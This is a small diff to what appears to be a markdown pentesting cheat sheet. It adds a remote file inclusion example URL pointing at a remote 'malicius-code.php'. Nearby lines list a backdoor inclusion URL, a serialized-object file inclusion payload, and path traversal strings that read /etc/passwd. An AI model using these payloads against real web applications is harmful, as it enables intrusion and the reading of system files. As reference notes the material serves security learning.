@@ -71,6 +71,7 @@ cat  /var/log/nginx/access.log
 
 ## Attacs
 * RFI http://192.168.1.44/vuln_page.php?file=http://192.168.1.44/backdoor_
+    * http://192.168.1.44/some-page?page=http://192.168.1.44/other-page.htm/malicius-code.php
 * LFI http://192.168.1.44/vuln.php?data=O:8:%22Example1%22:1:{s:10:%22cache_file%22;s:15:%22../../index.php%22;}
     * http://192.168.1.44/script.php?page=../../../../../../../../etc/passwd
     * http://192.168.1.44/get-files?file=../../../../some dir/some file
